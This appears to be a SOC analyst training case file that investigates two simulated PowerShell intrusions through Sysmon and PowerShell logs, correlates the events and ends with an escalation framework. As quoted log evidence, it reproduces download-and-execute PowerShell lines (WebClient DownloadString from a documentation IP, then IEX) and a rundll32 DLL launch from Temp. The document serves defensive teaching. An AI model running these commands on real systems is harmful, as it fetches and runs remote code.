# 🕵️ Case File 08 — Sysmon Network Connection Investigation

## Case Overview

This case file documents practical investigations performed during Day 10 of the SOC Analyst Challenge.

The investigations focused on identifying suspicious network activity and correlating Sysmon Event ID 3 with:

- Process creation
- PowerShell Script Block Logging
- File creation
- File execution
- Parent-child process relationships
- User and host context

---

# Case Study 1 — Suspicious PowerShell Connection

## Host

`WIN-CLIENT-12`

## User

`anisha`

## Investigation Window

`16:41–16:48`

---

## Timeline

### Event 1 — Successful Logon

```text
16:41:03
Windows Event ID 4624

User: anisha
Logon Type: 2
Source: LOCAL
Status: Success
```

This event provides authentication context.

---

### Event 2 — Process Creation

```text
16:42:17
Sysmon Event ID 1

explorer.exe
    ↓
powershell.exe

Command:
powershell.exe -Command "Get-Service"
```

This activity appeared relatively normal because:

- `explorer.exe` launched PowerShell.
- `Get-Service` is a legitimate administrative command.
- No obvious hidden or encoded execution was present.

---

### Event 3 — Network Connection

```text
16:42:20
Sysmon Event ID 3

Process:
powershell.exe

Destination:
10.10.10.15:443
```

The connection was not automatically classified as malicious.

The destination required contextual validation.

---

### Event 4 — Suspicious Process Creation

```text
16:47:31
Sysmon Event ID 1

EXCEL.EXE
    ↓
powershell.exe

-WindowStyle Hidden
-ExecutionPolicy Bypass
-EncodedCommand [REDACTED]
```

This became the major investigation pivot.

The combination of:

- Excel spawning PowerShell
- Hidden execution
- Execution-policy bypass
- Encoded command

made the activity highly suspicious.

---

### Event 5 — PowerShell Script Block

```text
16:47:33
Event ID 4104

$client = New-Object System.Net.WebClient

$data = $client.DownloadString(
"http://198.51.100.25/update"
)

Set-Content `
"C:\Users\anisha\AppData\Local\Temp\update.ps1" `
$data
```

This showed that PowerShell:

1. Created a network client.
2. Downloaded external content.
3. Wrote the content to `update.ps1`.

---

### Event 6 — Network Connection

```text
16:47:34
Sysmon Event ID 3

powershell.exe
    ↓
198.51.100.25:80
```

This correlated with the external download activity shown in Event 5.

---

### Event 7 — File Creation

```text
16:47:37
Sysmon Event ID 11

C:\Users\anisha\AppData\Local\Temp\update.ps1
```

The downloaded content was written to disk.

---

### Event 8 — Process Creation

```text
16:47:41
Sysmon Event ID 1

powershell.exe
    ↓
rundll32.exe

Command:
rundll32.exe
C:\Users\anisha\AppData\Local\Temp\update.dll,Start
```

This represented a significant escalation because `rundll32.exe` was used to execute a DLL from the user's temporary directory.

---

## Correlated Timeline

```text
EXCEL.EXE
    ↓
PowerShell
    ↓
Hidden / ExecutionPolicy Bypass / EncodedCommand
    ↓
Download external content
    ↓
External network connection
    ↓
File creation
    ↓
rundll32.exe
    ↓
DLL execution
```

---

## Classification

**Malicious**

## Confidence

**High**

## Severity

**High**

## Escalation

**Yes — escalate to Tier 2 / senior analyst.**

---

## Evidence

Three important pieces of evidence were:

1. Excel launched PowerShell with hidden execution, execution-policy bypass, and an encoded command.
2. PowerShell downloaded external content from `198.51.100.25`.
3. The activity resulted in file creation and subsequent DLL execution through `rundll32.exe`.

---

## Unknowns

The investigation did not establish:

1. Who controls `198.51.100.25`.
2. What the downloaded payload or DLL actually did after execution.
3. Whether persistence or additional system impact occurred.

---

# Case Study 2 — Legitimate Activity vs Malicious Activity

## Host

`WIN-SRV-04`

## User

`helpdesk`

## Investigation Window

`09:10–09:32`

---

## Initial Activity

### Event 1

```text
09:10:14
Windows Event ID 4624

User: helpdesk
Logon Type: 3
Source: 10.10.10.25
Status: Success
```

This established authentication context.

---

### Event 2

```text
09:12:03
Sysmon Event ID 1

services.exe
    ↓
powershell.exe

User: SYSTEM

Command:
Get-Service
```

This appeared consistent with administrative activity.

---

### Event 3

```text
09:12:05
Sysmon Event ID 3

powershell.exe
    ↓
10.10.10.10:443
```

This was not automatically malicious.

The internal destination still required validation.

---

### Event 4

```text
09:24:41
Sysmon Event ID 1

EXCEL.EXE
    ↓
powershell.exe

-ExecutionPolicy Bypass
-Command "Get-Process"
```

This was suspicious and required investigation, but did not independently prove compromise.

---

### Event 5

```text
09:24:43
Event ID 4104

Get-Process
Get-Service
Get-WmiObject Win32_OperatingSystem
```

These commands can be legitimate administrative or system-discovery activity.

---

### Event 6

```text
09:24:46
Sysmon Event ID 3

powershell.exe
    ↓
10.10.10.10:443
```

This required contextual validation.

---

## Malicious Activity

### Event 7

```text
09:31:22
Sysmon Event ID 1

EXCEL.EXE
    ↓
powershell.exe

-WindowStyle Hidden
-ExecutionPolicy Bypass
-EncodedCommand [REDACTED]
```

This became a major investigation pivot.

---

### Event 8

```text
09:31:24
Event ID 4104

$wc = New-Object System.Net.WebClient

$payload = $wc.DownloadString(
"http://198.51.100.25/update"
)

IEX $payload
```

This showed:

1. A network client being created.
2. External content being downloaded.
3. The downloaded content being executed using `IEX`.

`IEX` represents `Invoke-Expression`, which executes the contents supplied to it as PowerShell code.

---

### Event 9

```text
09:31:26
Sysmon Event ID 3

powershell.exe
    ↓
198.51.100.25:80
```

This correlated with the external download.

---

### Event 10

```text
09:31:30
Sysmon Event ID 11

C:\Users\helpdesk\AppData\Local\Temp\svchost.exe
```

A file named `svchost.exe` was created in the user's temporary directory.

This location is inconsistent with the normal location of the legitimate Windows `svchost.exe` executable and therefore increased the level of concern.

---

### Event 11

```text
09:31:34
Sysmon Event ID 1

powershell.exe
    ↓
svchost.exe

C:\Users\helpdesk\AppData\Local\Temp\svchost.exe
```

The newly created executable was subsequently executed.

---

## Malicious Chain

```text
Event 7
   ↓
Event 8
   ↓
Event 9
   ↓
Event 10
   ↓
Event 11
```

Supporting context:

```text
Event 4
   ↓
Event 7
```

Earlier administrative activity should not automatically be classified as malicious.

---

## Classification

**Malicious**

## Confidence

**High**

## Severity

**High**

## Escalation

**Yes**

---

## Evidence vs Unknowns

### Evidence

- Excel launched PowerShell with suspicious execution parameters.
- PowerShell downloaded external content.
- `IEX` was used to execute the downloaded PowerShell content.
- `svchost.exe` was created in a user Temp directory.
- The created executable was subsequently executed.

### Unknowns

- Who controls `198.51.100.25`.
- What the downloaded payload and `svchost.exe` actually did after execution.
- Whether persistence, credential access, lateral movement, or additional impact occurred.

---

# Analyst Decision Framework

The cases demonstrate three possible SOC outcomes.

## Close

Use when activity is validated as legitimate and expected.

## Monitor

Use when activity is unusual but there is insufficient evidence to classify it as malicious.

## Escalate

Use when correlated evidence provides strong support for malicious activity.

---

# Example Tier 2 Escalation Note

> High-confidence malicious PowerShell activity was identified through correlated telemetry showing hidden PowerShell execution with ExecutionPolicy Bypass and an encoded command, followed by external payload retrieval, file creation, and subsequent execution. The alert is being escalated to Tier 2 for further investigation of payload behavior, persistence, and potential system impact.

---

# Final Analyst Takeaway

The most important lesson from these investigations was:

> **A single suspicious event rarely tells the complete story.**

A stronger SOC investigation correlates:

```text
Process
   ↓
PowerShell
   ↓
Network
   ↓
Script
   ↓
File
   ↓
Execution
   ↓
Post-execution behavior
```

The analyst should then separate:

**What is proven → What is inferred → What remains unknown**

before making the final decision to:

**Close → Monitor → Escalate**